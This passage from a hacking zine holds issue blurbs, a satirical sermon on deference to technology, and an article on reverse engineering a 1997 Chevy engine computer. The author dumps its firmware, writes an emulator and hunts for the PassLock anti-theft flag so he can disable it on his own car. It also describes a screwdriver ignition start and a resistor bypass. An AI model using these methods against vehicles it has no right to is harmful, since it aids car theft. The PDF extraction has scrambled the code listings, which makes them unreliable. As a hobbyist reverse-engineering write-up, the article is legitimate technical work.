hex viewer IDE that will help you reverse engineer
itself. Ain’t that nifty?
Pastor Laphroaig has a sermon on intellectual
tyranny dressed up in the name of science on page 5.
On page 7, Brandon Wilson shares his techniques
for emulating the 68K electronic control unit (ECU)
of his 1997 Chevy Cavalier. Even after 315 thousand
miles, there are still things to learn from your daily
driver.
As quick companion to Brandon’s article, De-
viant Ollam was so kind as to include an article de-
scribing why electronic defenses are needed, beyond
just a strong lock. You’ll find his explanation on
page 17.
Page 18 features uses for useless bugs, finger-
printing proprietary forks of old codebases by long-
lived unexploitable crashes, so that targets can be
accurately identified before the hassle of making a
functioning exploit for that particular version.
Page 21 holds Yannay Livneh’s Adventure of
the Fragmented Chunks, describing a modern heap
based buffer overflow attack against a recent version
of VLC.
3On page 39, you will find Maribel Hearn’s tech-
nique for dumping the protecting BIOS ROM of the
Game Boy Advance. While there is some lovely prior
work in this area, her solution involves the craziest
of tricks. She executes code from unmapped parts of
the address space, relying of bus capacitance to hold
just one word of data without RAM, then letting
the pre-fetcher trick the ROM into believing that it
is being executed. Top notch work.
Cornelius Diekmann, on page 45, shows us a
nifty trick for the naming of Ethernet devices on
Linux. Rather than giving your device a name of
eth0 or wwp0s20f0u3i12, why not name it some-
thing classy in UTF8, like ? (Not to be confused
with , of course.)
On page 47, JBS introduces us to symbolic re-
gression, a fancy technique for fitting functions to
available data. Through this technique and a sym-
bolic regression solver (like the one included in the
feelies), he can craft absurdly opaque functions that,
when called with the right parameters, produce a
chosen output.
Given an un-annotated stack trace, with no
knowledge of where frames begin and end, Matt
Davis identifies stack return addresses by their prox-
imity to high-entropy stack canaries. You’ll find it
on page 49.
Binary Ninja is quite good at identifying explicit
function calls, but on embedded ARM it has no
mechanism for identifying functions which are never
directly called. On page 52, Travis Goodspeed walks
us through a few simple rules which can be used to
extend the auto-analyzer, first to identify unknown
parents of known child functions and then to identify
unknown children called by unknown parents. The
result is a Binary Ninja plugin which can identify
nearly all functions of a black box firmware image.
On page 58, Evan Sultanik explains how he in-
tegrated the hex viewer IDE from Kaitai Struct as
a shell script that runs a Python webserver within
this PDF polyglot.
On page 60, the last page, we pass around the
collection plate. Our church has no interest in bit-
coins or wooden nickels, but we’d love your donation
of a nifty reverse engineering story. Please send one
our way.
416:02
Do you have a moment to talk about Enlightenment?
by Pastor Manul Laphroaig
Howdy neighbors. Do you have a moment to talk
about Enlightenment?
Enlightenment! Who doesn’t like it, and who
would speak against it? It takes us out of the Dark
Ages, and lifts up us humans above prejudice. We
are all for it—so what’s to talk about?
There’s just one catch, neighbors. Mighty few
who actually live in the Dark Ages would own up to
it, and even if they do, their idea of why they’re Dark
might be totally different from yours. For instance,
they might mean that the True Faith is lost, and
abominable heretics abound, or that their Utopia
has had unfortunate setbacks in remaking the world,
or that the well-deserved Apocalypse or the Singu-
larity are perpetually behind schedule. So we have
to do a fair bit of figuring what Enlightenment is,
and whether and why our ages might be Dark.
Think of it: there are still those among us who
thought medicine would be improved by making
doctors ask every patient every time they came to
the office how they felt “on the scale from 1 to 10,”
and by entering these meaningless answers into a
computer. (If, for some reason, you resent these
metrics being called meaningless, try to pick a dif-
ferent term for an uncalibrated measurement, or ask
a nurse to pinch you for 3 or 7 the next time you
see one.) These people somehow got into power and
made this happen, despite every kind of common
sense.
Forget for a moment the barber shops in Boston
or piano tuners in Portland—and estimate how many
man-hours of nurses’ time was wasted by punching
these numbers in. Yet everyone just knows com-
puters make everything more efficient, and techno-
paternalism was in vogue. “Do computers really
make this better?” was the question everyone was
afraid to ask.
If this is not a cargo cult, what is? But, more im-
portantly, why is everyone simply going along with
it and not talking about it at all? This is how you
know a tyranny in the making. And if you think the
cost of this silence is trivial, consider Appendix A of
Electronic Health Record–Related Events in Medical
Malpractice Claims by Mark Graber & co-authors,
on the kinds of computer records that killed the pa-
tient. 1 You rarely see a text where “patient expired”
occurs with such density.
Surely not, you say. For we have Science, and
even its ultimate signal achievements, the Computer
and the Internet. Dark Ages is other people.
And yet we feel it: the intellectual tyranny in the
name of science, of which Richard Feynman warned
us in his day. It hasn’t gotten better; if anything, it
has gotten worse. And it has gotten much worse in
our own backyard, neighbors.
I am talking of foisting computers on doctors and
so many other professions where the results are not
so drastic, but still have hundreds of thousands of
people learning to fight the system as a daily job re-
quirement. Yet how many voices do we hear asking,
“wait a minute, do computers really belong here?
Will they really make things better? Exactly how
do you know?”
When something doesn’t make sense, but you
hear no one questioning it, you should begin to
worry. The excuses can be many and varied—
Science said so, and Science must know better; there
surely have been Studies; it says Evidence-based on
the label; you just can’t stop Progress; being fear-
ful of appearing to be a Luddite, or just getting to
pick one’s battles. But a tyranny is a tyranny by
any other name, and you know it by this one thing:
something doesn’t make sense, but no one speaks of
it, because they know it won’t help at all.
1 unzip
pocorgtfo16.pdf ehrevents.pdf
5Just as Feynman warned of intellectual tyranny
in the name of science, there’s now intellectual
tyranny in the name of computer technology.
Even when something about computers obvi-
ously doesn’t make sense, people defer judgment
to some nebulous authority who must know better.
And all of this has happened before, and it will all
happen again.
–——–
———
—–—–
And then we find ourselves out in a world where
smart means “it crashes; it can lie to you; occasion-
ally, it explodes.” And yet rejecting it is an act so
unusual that rejectionists stand out as the Amish on
the highway, treated much the same.
Some of you might remember the time when
“opening this email will steal your data” was the
funniest hoax of the interwebs. Back then, could we
have guessed that “Paper doesn’t crash.” would have
such an intimate meaning to so many people?
–——–
———
—–—–
So does it get better, neighbors? In 1784, Kant
wrote,
And in this, neighbors, lies our key to under-
standing Enlightenment. When Emmanuel Kant set
out to write about it in 1784, he defined the lack
of it as self-imposed immaturity, a school child-like
deference to some authority rather than daring to
use one’s own reason; not because it actually makes
sense, but because it’s easier overall. This is a de-
ferral so many of us have been trained in, as the
simplest thing to do under the circumstances.
The authority may hold the very material stick
or merely the power of scoffing condescension that
one cannot openly call out; it barely matters. What
matters is acceding to be led by some guardians, not
out of a genuine lack of understanding but because
one doesn’t dare to set one’s own reason against
their authority. It gets worse when we make a virtue
of it, as if accepting the paternalistic “this is how it
should be done,” somehow made us better human
beings, even if we did it not entirely in good faith
but rather for simplicity and convenience.
I have emphasized the main point
of the enlightenment—man’s emergence
from his self-imposed non-adulthood—
primarily in religious matters, because
our rulers have no interest in playing the
guardian to their subjects in the arts and
sciences.
Lo and behold, that time has passed. These
days, our would-be guardians miss no opportunity
to make it known just what we should believe about
science—as Dr. Lysenko turns green with envy in
his private corner of Hell, but also smiles in antici-
pation of getting some capital new neighbors. I won-
der what Kant would think, too, if he heard about
“believing in science” as a putative virtue of the en-
lightened future—and just how enlightened he would
consider the age that managed to come up with such
a motto.
But be it as it may, his motto still remains our
cry of hope: “Sapere aude!” Or, for those of us
less inclined to Latin, “Build you own blessed bird-
feeder!”
Amen.
Kant’s answer to this was, “Sapere aude!”—“Dare
to know! Dare to reason!” Centuries later, this re-
mains our only cry of hope.
Consider, neighbors: these words were written
in 1784: This enlightenment requires nothing but
freedom—and the most innocent of all that may be
called “freedom:” freedom to make public use of
one’s reason in all matters. Now I hear the cry
from all sides: “Do not argue!” The officer says:
“Do not argue—drill!” The tax collector: “Do not
argue–pay!” The pastor: “Do not argue—believe!”
Or—and how many times have we heard this one,
neighbors?—“Do not argue—install!”
616:03
Saving My ’97 Chevy by Hacking It
by Brandon L. Wilson
Hello everyone!
Today I tell a story of both joy and woe, a story
about a guy stumbling around and trying to fix
something he most certainly does not understand. I
tell this story with two goals in mind: first to enter-
tain you with the insane effort that went into fixing
my car, then also to motivate you to go to insane
lengths to accomplish something, because in my ex-
perience, the crazier it is and the crazier people tell
you that you are to attempt it, the better off you’ll
be when you go ahead and try it.
Let me start by saying, though: do not hack your
car, at least not the car that you actually drive. I
cannot stress that enough. Do keep in mind that you
are messing with the code that decides whether the
car is going to respond to the steering wheel, brakes,
and gas pedal. Flip the wrong bit in the firmware
and you might find that YOU have flipped, in your
car, and are now in a ditch. Don’t drive a car run-
ning modified code unless you are certain you know
what you’re doing. Having said that, let’s start from
the beginning.
Once upon a time, I came into the possession
of a manual transmission 1997 Chevrolet Cavalier.
This car became a part of my life for the better part
of 315,000 miles. 2 One fine day, I got in to take
off somewhere, turned the key, heard the engine fire
up—and then immediately cut off.
Let me say up front that when it comes to cars, I
know basically nothing. I know how to start a car, I
know how to drive a car, I know how to put gas in a
car, I know how to put oil in a car, but in no way am
I an expert on repairing cars. Before I could even
begin to understand why the car wouldn’t start, I
had to do a lot of reading to understand the basics
on how this car runs, because every car is different.
In the steering column, behind the steering wheel
and the horn, you have two components physically
locked into each other: the ignition lock cylinder and
the ignition switch. First, the key is inserted into
the ignition lock cylinder. When the key is turned,
it physically rotates inside the ignition lock cylin-
der, and since the ignition switch is locked into it,
turning the key also activates the ignition switch.
The activation of that switch supplies power from
the battery to everywhere it needs to go for the car
to actually start.
But that’s not the end of the story: there’s still
the anti-theft system to deal with. On this car, it’s
something called the PassLock security system. If
the engine is running, but the computer can’t de-
tect the car was started legitimately with the orig-
inal key, then it disables the fuel injectors, which
causes the car to die.
Since the ignition switch physically turning and
supplying battery power to the right places is what
makes the car start, stealing a car would normally
be as simple as detaching the ignition switch, stick-
ing a screwdriver in there, and physically turning it
the same way the key turns it, and it’ll fire right
up. 3
So the PassLock system needs to prevent that
from working somehow. The way it does this starts
with the ignition lock cylinder. Inside is a resistor of
a certain resistance, known by the instrument panel
cluster, which is different from car to car. When
physically turning the cylinder, that certain resis-
2 Believe
3 This
it or not, those miles were all on the original clutch. You can see why I might want to save it.
is helpfully described by Deviant Ollam on page 17. –PML
78tance is applied to a wire connected to the instru-
ment panel cluster. As the key turns, a signal is
sent to the instrument panel cluster. The cluster
knows whether that resistance is correct, and if and
only if the resistance is correct, it sends a password
to the PCM (Powertrain Control Module), other-
wise known as the main computer. If the engine has
started, but the PCM hasn’t received that “pass-
word” from the instrument panel cluster, it makes
the decision to disable the fuel injectors, and then il-
luminate the “CHECK ENGINE” and “SECURITY”
lights on the instrument panel cluster, with a diag-
nostic trouble code (DTC) that indicates the secu-
rity system disabled the car.
So an awful lot of stuff has to be working cor-
rectly in order for the PCM to have what it needs
to not disable the fuel injectors. The ignition
lock cylinder, the instrument panel cluster, and the
wiring that connects those to each other and to the
PCM all has to be correct, or the car can’t start.
Since the engine in my car does turn over (but
then dies), and the “SECURITY” warning light on
the instrument panel cluster lights up, that means
something in the whole chain of the PassLock sys-
tem is not functioning as it should.
Naturally, I start replacing parts to see what
happens. First, the ignition lock cylinder might be
bad – so I looked up various guides online about
how to “bypass” the PassLock system. People do
that by installing their own resistor on the wires
that lead to the instrument panel cluster, then trig-
gering a thirty-minute “relearn” procedure so that
the instrument panel cluster will accept the new re-
sistor value. 4 Doing that didn’t seem to help at all.
Just in case I messed that up somehow, I decided
to buy a brand new ignition lock cylinder and give
that a try. Didn’t help.
Then I thought maybe the ignition switch is bad,
so I put a new one of those in as well. Didn’t help.
Then I thought maybe the clutch safety switch had
gone bad (the last stop for battery power on its way
from the ignition switch to the rest of the car) –
checking the connections with a multi-meter indi-
cated it was functioning properly.
I even thought that maybe the computer had
somehow gone bad. Maybe the pins on it had cor-
roded or something – who knows, anything could be
causing it not to get the password it needs from the
instrument panel cluster. There is a major problem
with replacing this component however, and that is
4 This
that the VIN, Vehicle Identification Number, unique
to this particular car, is stored in the PCM. Not only
that, but this password that flies around between
the PCM and instrument panel cluster is generated
from the VIN number. The PCM and panel are
therefore “married” to each other; if you replace one
of them, the other needs to have the matching VIN
number in it or it’ll cause the same problem that I
seem to be experiencing.
Fortunately, one can buy replacement PCMs on
eBay, and the seller will actually pre-flash it with the
VIN number that the buyer specifies. I bought from
eBay and slapped it in the car, but it still didn’t
work.
At this point, I have replaced the ignition lock
cylinder, the ignition switch, even the computer it-
self, and still nothing. That only leaves the instru-
ment panel cluster, which is prohibitively expensive,
or the wiring between all these components. There
are dozens upon dozens of wires connecting all this
stuff together, and usually when there’s a loose con-
nection somewhere, people give up and junk the
whole car. These bad connections are almost im-
possible to track down, and even worse, I have no
idea how to go about doing it.
So I returned all the replacement parts, except
for the PCM from eBay, and tried to think about
what to do next. I have a spare PCM that only
works with my car’s VIN number. I know that
the PCM disables the fuel injectors whenever it de-
tects an unauthorized engine start, meaning it didn’t
get the correct password from the instrument panel
cluster. And I also know that the PCM contains
firmware that implements this detection, and I know
that dealerships upgrade this firmware all the time.
If that’s the case, what’s to stop me from modifying
the firmware and removing that check?
Tune In and Drop Out
I began reading about a community of car tuners,
people who modify firmware to get the most out of
their cars. Not only do they tweak engine perfor-
mance, but they actually disable the security sys-
tem of the firmware, so that they can transplant
any engine from one car to the body of another car.
That’s exactly what I want to do; I want to disable
that feature entirely so that the computer doesn’t
care what’s going on outside it. If they can do it, so
can I.
is how old remote engine start kits work.
9How do other people disable this check? Accord-
ing to the internet, people “tune” their cars by load-
ing up the firmware image in an application called,
oddly enough, TunerPro. Then they load up what’s
called an XDF file, or a definition file, which de-
fines the memory addresses for configuration flags
for all sorts of things – including, of course, the en-
abling and disabling of the anti-theft functionality.
Then all they have to do is tell TunerPro “hey, turn
this feature off”, and it knows which bits or bytes to
change from the XDF file, including any necessary
checksums or signatures. Then it saves the firmware
image back out, and tuners just write that firmware
image back to the car.
It sounds easy enough – assuming the car pro-
vides an easy mechanism for updating the firmware.
Most tuners and car dealerships will update the
firmware through the OBD2 diagnostic port under
the steering column, which is on all cars manufac-
tured after 1996 (yay for me). Unfortunately, each
car manufacturer uses different protocols and differ-
ent tools to actually connect to and use the diag-
nostic port. For example, General Motors, which
is what I need to deal with, has a specific device
called a Tech2 scan tool, which is like a fancy code
reader, which can be plugged into the OBD2 port.
It’s capable of more than just reading diagnostic
trouble codes, though; it can upload and download
the firmware in the PCM. There’s just one prob-
lem: it’s ridiculously expensive. This thing runs
anywhere from a few hundred for the Chinese clone
to several thousands of dollars!
I spent some time looking into what protocol it
uses, so that I could do what it does myself – but
no such luck. It seems to use some sort of propri-
etary obfuscated algorithm so the PCM has to be
“unlocked” before it can be read from or written to.
GM really doesn’t want me doing myself what this
tool does. Even worse, after doing a little googling,
it seems there is no XDF file for my particular car,
so I have to find these memory addresses myself.
Luckily, there appears to be a 512KB flash chip
on board. I know from googling about TunerPro
and others’ experience with firmware from the late
nineties that this is exactly the right size to hold
the PCM firmware image. Fortunately, I have man-
aged to physically extract chips like this before, so I
de-soldered the chip, inserted it into an old Willem
EEPROM programmer, and managed to dump the
entire 512KB of memory. What now?
Thankfully, Google has come to the rescue and
presented me with a series of forum posts that tell
me how to interpret this firmware dump. These old
The first step is to get at the firmware. If I can’t
simply plug into the OBD2 port and read or write
the firmware, I’m going to have to get physical. I
find the PCM, unplug it from the car, unscrew the
top cover, and start starting at what’s underneath.
10posts were pretty much the only help I could find on
the subject, so I had to decipher some guy’s notes
and do the best I could.
Apparently the processor in this PCM and oth-
ers of its era is a Motorola 68332. I just so happen to
have a history with the Motorola 68K series CPUs.
Ever since high school I have messed with BASIC
and assembly programming for Texas Instruments
graphing calculators, some of which have a Motorola
68K CPU, and I enjoy collecting and tinkering with
old game consoles, which is good because the Sega
Genesis just so happens to have a Motorola 68K
CPU.
It sure would be nice to confirm in some way
if this file really was dumped correctly and this re-
ally is Motorola 68K firmware being executed by
this PCM. There ought to be a vector table at the
beginning of memory, containing handler addresses
that the CPU executes in response to certain events.
For example, when the CPU first gets power, it has
to start executing from the value at address 0x00-
0004, which holds what is called the Reset Vector.
Looking at that address, I see 00 00 40 04. I fire
up IDA Pro, go to address 0x4004, and hit C to
start analyzing code at that address – but I get to-
tal garbage.
That’s strange – since that didn’t pan out, I start
looking for human-readable strings. I find only one,
which appears to be a 17-character VIN number,
except that it’s not a VIN number.
derstand all this code.
I have to remind myself that my goal is to dis-
able the check on whether we’ve received the pass-
word or not from the instrument panel cluster – but
I have absolutely no idea where in the firmware that
check is. There doesn’t seem to exist an XDF file
for my 1997 Chevrolet Cavalier. But – maybe one
does exist for a very similar car. If I can know the
memory address I want to change in somebody else’s
firmware image, and it’s similar enough to mine,
maybe that’ll give me clues to finding the memory
address in my own image.
After doing lots. . . and lots. . . of googling, the
closest firmware image I could find which had a
matching XDF file was for the 2001 Pontiac Trans
Am. I load up this firmware image in TunerPro
along with the corresponding XDF file, and a partic-
ular setting jumps out at me called “Option byte for
vehicle theft deterrent” – with a memory address of
0x1E5CC. I fire up IDA Pro against the 2001 Pontiac
Trans Am image and go to that memory address,
which puts me in the middle of a bunch of bytes that
are referenced all over the place in the code. This is
some sort of “configuration” area, which controls all
the features of the car’s computer. If I change this
byte in TunerPro and save the firmware image, it up-
dates two things: one, this option byte at 0x1E5CC,
and also a checksum word (two bytes) that protects
the configuration area from corruption or tamper-
ing. So to turn off the anti-theft system, I have to
flip a bit, update the checksums, write those changes
back to the car computer, and voila, I’m done. Now
all that’s left is to find the same code that uses that
bit in my 1997 Chevrolet Cavalier firmware image.
Sounds simple enough.
1 String :
1 G1J11C72V24767321
A c t u a l VIN : 1 G1JC1272V7476231
I stared at this until I realized that if I swap every
two characters, or bytes, in the actual VIN number,
I get the string from the disassembly. It seems the
image is a little jumbled up – googling for meaning
behind this reveals that the image is byte-swapped.
This is how the bytes are actually stored on the chip,
but this isn’t what I want – I want the bytes back in
the original order, the way they’re being executed.
After swapping every pair of bytes and then looking
at address 0x000004, I don’t see 00 00 40 04 – I
see 00 00 04 40. If I go to 0x440 in IDA Pro and
start analyzing, I see an explosion of readable code.
In fact, I see a beautiful graph of how cleanly this
file disassembled.
I’m ecstatic that I have a clean and proper
firmware image loaded into IDA Pro, but what now?
It would take years for me to properly and truly un-
IsVATSPresent_IThinkD0NZIfPresent :
2 7 a754 :
cmpi . b #2, ( VATS_type ) . l
7 a75c :
sne
d0
4 7 a75e :
neg . b d0
7 a756 :
and . b ( byte_FFFF8BE5 ) . w, d0
6 7 a764 :
rts
The byte at 0x1E5CC is referenced all over the
place – but there’s only one place in particular with
a small subroutine that looks at the specific bit we
care about. If I can find this same subroutine in my
own firmware image, I’m in business.
I look for these exact instructions in my own
firmware image, but they isn’t there. I look for any
comparison to bit 2 of a particular byte, but there
are none. I look for “sne d0” followed by “neg.b
11d0” – but no dice. I look for the same instructions
acting on any register at all – but no matches. I try
dozens and dozens of other code matching patterns
– but no matches.
I thought it would be really simple to look for
the same or a similar code pattern in my firmware
image and I’d have no trouble finding it, but ap-
parently not. These TunerPro XDF definition files
get created by somebody, right? How do they find
all these memory addresses of interest, so they can
build these XDF files?
According to the forum posts I found, 5 they first
look for a particular piece of functionality: the han-
dling of OBD2 code reader requests. The PCM is
what’s responsible for receiving the commands from
a code reader, generating a response, and then send-
ing it back over the OBD2 port to the code reader
tool. Somewhere in this half-megabyte mess is all
the code that handles these requests.
These OBD2 tools are capable of retrieving more
than just diagnostic trouble codes. Not only can
they upload and download firmware images for the
PCM, but they can also retrieve all sorts of real-
time engine information, telling you exactly what
the computer’s doing and how well it’s doing it. It
can also return the anti-theft system status. So if
I can understand the OBD2 communication code, I
can find my way to the option flag in the 2001 Pon-
tiac Trans Am firmware. And if I can navigate my
way to the option flag in that firmware, then I can
just apply that same logic to my own firmware.
How can I find the code that handles these re-
quests? According to the “PCM hacking 101” forum
guide, I should start by looking for the code that
actually interacts with the OBD2 port.
So how does a Motorola 68K CPU interact with
the OBD2 port, or any hardware for that matter?
It uses something called memory-mapped I/O. In
other words, the hardware is wired in such a way,
that when reading from or writing to a particu-
lar memory address, it isn’t accessing bytes in the
firmware on the flash chip or in RAM; it’s manipu-
lating actual hardware.
In any given device, there is usually a range
of address space dedicated just to interacting with
hardware. I know it has to be outside the range of
where the firmware exists, and I know it has to be
outside the range of where the RAM exists.
I know how big the firmware is, and since it dis-
assembled so cleanly, I know it starts out at address
0, so that means the firmware goes from 0 all the
way up to 0x07FFFF.
I also know from poking around in the disassem-
bly that the RAM starts at 0xFF0000, but I don’t
know how big it is or where it ends. As a quick and
dirty way of getting close to an answer, I use IDA
Pro to export a .asm file, then have sed rip out the
memory addresses accessed by certain instructions,
then sort that list of memory addresses.
This way, I discover that typical RAM accesses
only go up to a certain point, and then things start
getting weird. I start seeing loops on reading val-
ues contained at certain memory addresses, and
no other references to writes at those memory ad-
dresses. It wouldn’t make sense to keep reading
the same area over and over, expecting something
to change, unless that address represents a piece of
hardware that can change. When I see code like
that, the only explanation is that I’m dealing with
memory-mapped I/O. So while I don’t have a com-
plete memory map just yet, I know where the hard-
ware accesses are likely to be.
Consulting the forum guide again, I learn that
one of the chips on the PCM circuit board is respon-
sible for handling all the OBD2 port communica-
tion. I don’t mean it handles the high-level request;
I mean it deals with all the work of interpreting the
raw signals from the OBD2 pins and translating that
into a series of bytes going back and forth between
the firmware and the device plugged into the OBD2
port. All it does is tell the firmware “Hey, something
sent 5 bytes to us. Please tell me what bytes you
want me to send back,” and the firmware deals with
all the logic of figuring out what those bytes will be.
This chip has a name – the MC68HC58 data
link controller – and lucky for me, the datasheet
is readily available. 6 It’s fairly comprehensive docu-
mentation on anything and everything I ever wanted
to know about how to interact with this controller.
It even describes the memory-mapped IO registers
which the firmware uses to communicate with it.
It tells me everything but the actual number, the
actual memory address the firmware is using to in-
teract with it, which is going to be unique for the
device in which it’s installed. That’s going to be up
to me to figure out.
After printing out the documentation for this
chip and some sleepless nights reading it, I figured
5 https://www.thirdgen.org/forums/diy-prom/507563-pcm-hacking-101-step.html
6 unzip
pocorgtfo16.pdf mc68hc58.pdf
12out some bytes that the firmware must be writing
to certain registers (to initialize the chip), otherwise
it can’t work, so I started hunting down where these
memory accesses were in the firmware. And sure
enough, I found them, starting at address 0xFFF6-
00.
So now that I’ve found the code that receives
a command from an OBD2 code reader, it should
be really easy to read the disassembly and get from
there to code that accesses our option flag, right?
I wish! The firmware actually buffers these re-
quests in RAM, and then de-queues them from that
buffer later on, when it’s able to get to it. And
then, after it has acted on the request and calcu-
lated a response, it buffers that for whenever the
firmware is able to get around to sending them back
to the plugged-in OBD2 device. This makes sense;
the computer has to focus on keeping the engine run-
ning smoothly, and not getting tied up with requests
on how well the engine is performing.
Unfortunately, while that makes sense, it also
makes it a nightmare to disassemble. The forum
guide does its best to explain it, but unfortunately
its information doesn’t apply 100% to my firmware,
and it’s just too difficult to extrapolate what I need
in order to find it. This is where things start getting
really nutty.
Emulation
If I can’t directly read the disassembly of the code
and understand it, then my only option is to execute
and debug it.
There are apparently people out there that ac-
tually do this by pulling the PCM out of the car
and putting it on a workbench, attaching a bunch
of equipment to it to debug the code in real-time
to see what it’s doing. But I have absolutely no
clue how to do that. I don’t have the pinouts for
the PCM, so even if I did know what I was doing,
I wouldn’t know how to interface with this specific
computer. I don’t know anything about the hard-
ware, I don’t know anything about the software –
all I know about is the CPU it’s running, and the
basics of a memory map for it. That is at least one
thing I have going for me – it’s extremely similar
to a very well-known CPU (the Motorola 68K), and
guaranteed to have dozens of emulators out there
for it, for games if nothing else.
Is it really possible I have enough knowledge
about the device to create or modify an emulator
to execute it? All I need the firmware to do is boot
just well enough that I can send OBD2 requests to
it and see what code gets executed when I do. It
doesn’t actually have to keep an engine running, I
just need to see how it gets from point A, which is
the data link controller code, to point B, which is
the memory access of the option flag.
If I’m going to seriously consider this, I have to
think about what language I’m going to do this in.
I think, live, breathe, and dream C] for my day job,
so that is firmly ingrained into my brain. If I’m re-
ally going to do this, I’m going to have to hack the
crap out of an existing emulator, I need to be able
to gut hardware access code, add it right back, and
then gut it again with great efficiency. So I want to
find a Motorola 68K emulator in C].
You know you’ve gone off the deep end when
you start googling for a Motorola 68K emulator in
a managed language, but believe it or not, one does
7 https://www.codeproject.com/Articles/998595/CPS-NET-a-Csharp-based-CPS-MAME-emulator
13exist. There is an old Capcom arcade system called
the CPS1, or Capcom Play System 1. It was used as
a hardware platform for Street Fighter II and other
classic games. Somebody went to the trouble of cre-
ating an emulator for this thing, with a full-featured
debugger, totally capable of playing the games with
smooth video and sound, right on Code Project. 7
I began to heavily modify this emulator, com-
pletely gutting all the video-related code and display
hardware, and all the timers and other stuff unique
to the CPS1. I spent a not-insignificant amount of
time refactoring this application so it was just a Mo-
torola 68K CPU core, and with the ability to extend
it with details about the PCM hardware. 8
Once I had this Motorola 68K emulator in C], it
was time to get it to boot the 2001 Pontiac Trans
Am image. I fire it up, and find that it immediately
encounters an illegal instruction. I can’t say I’m
very surprised – I proceed to take a look at what’s
at that memory address in IDA Pro.
When going to the memory address of the ille-
gal instruction, I saw something I didn’t expect to
see. . . a TBLU instruction. What in the world? I
know I’ve never seen it before, certainly not in any
Sega Genesis ROM disassembly I’ve ever dealt with.
But, IDA Pro knew how to display it to me, so that
tells me it’s not actually an illegal instruction. So, I
look in the Motorola 68332 user manual, 9 and look
up the TBLU instruction.
Without getting too into the weeds on instruc-
tion decoding, I’ll just say that this instruction basi-
cally performs a table lookup and calculates a value
based on precisely how far into the table you go, uti-
lizing both whole and fractional components. Why
in the world would a CPU need an instruction that
does this? Actually it’s very useful in exactly this
application, because it lets the PCM store complex
tables of engine performance information, and it can
quickly derive a precise value when communicating
with various pieces of hardware.
It’s all very fascinating I’m sure, but I just want
the emulator to not crash upon encountering this in-
struction, so I put a halfway-decent implementation
of that instruction into the C] emulator and move
on. Digging into Motorola 68K instruction decoding
enabled me to fix all sorts of bugs in the CPS1 em-
ulator that weren’t a problem for the games it was
emulating, but it was quite a problem for me.
6 e328 : mov . b
2 6 e330 : mov . b
6 e338 : mov . b
4 6 e340 : mov . b
6 e348 : mov . b
6 6 e350 : mov . b
6 e358 : mov . b
8 6 e360 : mov . b
6 e368 : mov . b
10 6 e370 : a n d i . b
6 e376 : o r i . b
12 6 e 3 7 c : b c l r
6 e382 : b s e t
14
loop88 :
6 e388 : b t s t
16 6 e 3 8 e : beq . s
6 e390 : u n l k
18 6 e392 : r t s
( byte_73dec ) . l , ( $FFFFFd48 ) . w
( byte_73ded ) . l , ( $FFFFFd49 ) . w
( byte_73dee ) . l , ( $FFFFFd4a ) . w
( byte_73dee ) . l , ( $FFFFFd4b ) . w
( byte_73dee ) . l , ( $FFFFFd4c ) . w
( byte_73dee ) . l , ( $FFFFFd4d ) . w
( byte_73def ) . l , ( $FFFFFd4e ) . w
( byte_73de4 ) . l , ( $FFFFFc1a ) . w
( byte_73de8 ) . l , ( $FFFFFc1c ) . w
#$F0 , ($FFFFFC1C) . w
#$E ,
($FFFFFC1C) . w
#7,
($FFFFFC1F) . w
#7,
($FFFFFC1A) . w
#7,
($FFFFFC1F) . w
loop88
a6
Once I got past the instructions that the emu-
lator didn’t yet have support for, I’m now onto the
next problem. The emulator’s running. . . but now
it’s stuck in an infinite loop. The firmware appears
to keep testing bit 7 of memory address 0xFFFC1F
over and over, and won’t continue on until that bit
is set. Normally this code would make no sense,
since there doesn’t appear to be anything else in the
firmware that would make that value change, but
since 0xFFFC1F is within the range that I think is
memory-mapped I/O, this probably represents some
hardware register.
What this code does, I have no idea. Why we’re
waiting on bit 7 here, I have no idea. But, now that
I have an emulator, I don’t have to care one bit. 10
8 git
clone https://github.com/brandonlw/pcmemulator
pocorgtfo16.pdf mc68332um.pdf
10 We the editors politely apologize for this pun, which is entirely the fault of the author. –PML
11 To be more accurate, I do this a few dozen more times and then happily move on.
9 unzip
14I fix this by patching the emulator to always say
the bits are set when this memory address is ac-
cessed, and we happily move on. 11 Isn’t emulation
grand?
I scratched my head on this one for a long time,
but I finally remembered something from the forum
guide: the routines that handle OBD2 requests are
executed by “main scheduling routines.” If the pro-
cessing of messages is on a schedule, then that im-
plies some sort of hardware timer. You can’t sched-
ule something without an accurate timer. That
means the firmware must be keeping track of the
number of accurate ticks that pass. So if I check the
vector table, where the handlers for all interrupts
are defined, I ought to find the handler that triggers
scheduling events.
e l s e i f ( a d d r e s s == 0xFFF70F )
return 0 x02 | 0 x01 ;
e l s e i f ( a d d r e s s == 0xFFFC1F)
4
return −1; // 0xFF
e l s e i f ( a d d r e s s == 0xFFF60E )
6
// . . .
2
Now I’ve finally gotten to the point that the
firmware has entered its main loop, which means it’s
functioning as well as I can expect, and I’m ready
to begin adding code that emulates the behavior of
the data link controller chip. Since I now know what
memory addresses represent the hardware registers
of the data link controller, I simply add code that
pretends there is no OBD2 request to receive, until
I start clicking buttons to simulate one.
move . b #1 ,( I n t e r r u p t V e c t o r 1 0 8 F l a g ) . w
2 move . l ( I n t e r r u p t V e c t o r 1 0 8 F l a g C o u n t e r ) . w, d3
addq . l #1, d3
4 move . l d3 , ( I n t e r r u p t V e c t o r 1 0 8 F l a g C o u t n e r ) . w
cmpi . l #$7FFFFFFF , d3
6 bne . s lov_2a18c
jsr
( Stop2700 ) . l
8
loc_2a18c :
jsr
DoL ots OfH ar dwa reR eg ist erR ead sW rit es
10 t s t . b ( byte_FFFFAE6E ) . w
bne . s locret_2A19E
12 j s r
sub_71FC2
locret_2A19E :
14 r t s
I enter the bytes that make up an OBD2 re-
quest, and tell the emulator to simulate the data
link controller sending those bytes to the firmware
for processing. Nothing happens. Imagine that, yet
another problem to solve!
This routine, whenever a specific user interrupt
fires, will set a flag to 1, and then increment a
counter by 1. As it turns out, this counter is checked
within the main loop – this is actually the number
of ticks since the firmware has booted. The OBD2
request handling routines only fire when a certain
number of ticks have occurred. So all I have to do
is simulate the triggering of this interrupt periodi-
cally, say every few milliseconds. I don’t know or
care what the real amount of time is, just as long as
it keeps happening. And when I do this, I find that
the firmware suddenly starts sending the responses
to the simulated data link controller! Finally I can
simulate OBD2 requests and their responses.
Now all I need to do is throw together some code
to brute-force through all the possible requests, and
set a “breakpoint” on the code that accesses the op-
tion flag.
Many hours later, I have it! With an actual re-
quest to look at, I can do some googling and see
that it utilizes “mode $22,” which is where GM stuffs
non-standard OBD2 requests, stuff that can poten-
tially change over time and across models. Request
$1102 seems to return the option flag, among other
things.
15Now that I’ve found the OBD2 request in the
